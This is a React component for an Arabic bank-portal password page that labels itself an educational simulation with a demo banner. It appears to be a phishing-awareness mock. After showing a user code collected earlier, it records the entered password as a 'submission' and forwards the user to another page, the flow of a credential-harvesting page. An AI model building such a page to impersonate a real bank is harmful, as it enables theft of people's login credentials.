import React, { useState } from "react";
import { useNavigate, Link } from "react-router-dom";
import { Eye, EyeOff, User, Pencil, BarChart3, Info } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/components/ui/use-toast";
import DemoBanner from "@/components/bank/DemoBanner";
import PortalLogo from "@/components/bank/PortalLogo";
import PortalBottomNav from "@/components/bank/PortalBottomNav";
import { DEMO_CREDS, PRIVACY_NOTE } from "@/lib/bankData";
import { upsertSubmission } from "@/lib/portalSession";

const BTN = "#386641";

export default function Register() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const userCode = sessionStorage.getItem("portal_user_code") || "";
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const changeCode = () => {
    navigate("/portal");
  };

  const submit = (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    setTimeout(() => {
      upsertSubmission({ password });
      setLoading(false);
      sessionStorage.setItem("demo_session", userCode);
      navigate("/login");
    }, 700);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <DemoBanner />
      <div className="flex-1 flex items-start justify-center px-4 py-8">
        <div className="w-full max-w-md space-y-6">
          <div className="flex justify-center pt-2">
            <PortalLogo />
          </div>

          {/* User ID display box */}
          <div className="flex items-center justify-between gap-3 rounded-xl border border-[#A3B18A] bg-[#F7F9F4] p-4">
            <div className="flex items-center gap-3">
              <span className="w-10 h-10 rounded-full bg-slate-200 flex items-center justify-center text-[#2D6A4F]">
                <User className="w-5 h-5" />
              </span>
              <div className="leading-tight">
                <div className="text-sm font-bold text-[#2D6A4F]">كود المستخدم</div>
                <div className="text-base font-bold text-slate-900" dir="ltr">{userCode || "—"}</div>
              </div>
            </div>
            <button
              type="button"
              onClick={changeCode}
              className="flex items-center gap-1 text-sm text-[#2D6A4F] hover:underline"
            >
              تغيير
              <Pencil className="w-3.5 h-3.5" />
            </button>
          </div>

          <form onSubmit={submit} className="space-y-4">
            <div className="relative">
              <Input
                type={show ? "text" : "password"}
                placeholder="كلمة المرور"
                className="rounded-xl border-slate-200 py-6 pl-12"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                type="button"
                onClick={() => setShow(!show)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
              >
                {show ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>

            {error && <p className="text-sm text-red-600 text-center">{error}</p>}

            <div className="text-center">
              <button
                type="button"
                onClick={() => toast({ title: "استعادة كلمة المرور", description: "غير مفعّلة — نظام محاكاة تعليمي." })}
                className="text-sm text-[#2D6A4F] hover:underline"
              >
                نسيت كلمة المرور؟
              </button>
            </div>

            <div className="flex gap-2">
              <Button
                type="submit"
                disabled={loading}
                className="flex-1 text-white rounded-xl py-6 text-base"
                style={{ backgroundColor: BTN }}
              >
                {loading ? "جاري التحقق..." : "تسجيل الدخول"}
              </Button>
              <button
                type="button"
                onClick={() => toast({ title: "حاسبة الأقساط", description: "غير مفعّلة — نظام محاكاة تعليمي." })}
                className="w-12 shrink-0 rounded-xl border border-slate-200 bg-white flex items-center justify-center text-[#2D6A4F] hover:bg-slate-50"
              >
                <BarChart3 className="w-5 h-5" />
              </button>
            </div>
          </form>

          <PortalBottomNav />

          <div className="flex items-start gap-2 rounded-xl bg-[#2D6A4F]/5 border border-[#2D6A4F]/15 p-3 text-xs text-[#2D6A4F]">
            <Info className="w-4 h-4 shrink-0 mt-0.5" />
            <span>{PRIVACY_NOTE}</span>
          </div>

          <div className="text-center text-xs text-slate-400">
            <Link to="/" className="text-slate-500 hover:underline">العودة للرئيسية</Link>
            <span className="mx-2">·</span>
            <Link to="/portal" className="text-slate-500 hover:underline">البوابة</Link>
          </div>
        </div>
      </div>
    </div>
  );
}